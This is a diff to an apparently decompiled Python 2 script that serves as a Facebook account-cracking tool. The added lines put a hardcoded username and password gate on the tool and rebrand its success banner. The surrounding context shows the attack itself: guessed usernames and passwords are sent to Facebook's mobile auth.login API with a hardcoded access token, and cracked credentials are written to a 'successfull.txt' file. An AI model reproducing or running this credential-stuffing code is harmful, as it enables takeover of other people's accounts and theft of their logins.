@@ -8,6 +8,37 @@
 # Compiled at: 2022-01-19 11:21:23
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
+CorrectUsername = "5gspammingteam"
+
+CorrectPassword = "5g_spamming_team@"
+
+loop = 'true'
+
+while (loop == 'true'):
+
+    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
+
+    if (username == CorrectUsername):
+
+    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")        if (password == CorrectPassword):
+
+            print "Logged in successfully as " + username #Dev:5gspammingteam
+
+	    time.sleep(2)
+
+            loop = 'false'
+
+        else:
+
+            print "\033[1;97mWrong Password"
+
+            os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
+
+    else:
+
+        print "\033[1;97mWrong Username"
+
+        os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 
 def psb(z):
     for e in z + '\n':
@@ -244,7 +275,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[BCP-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[5G_ST-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
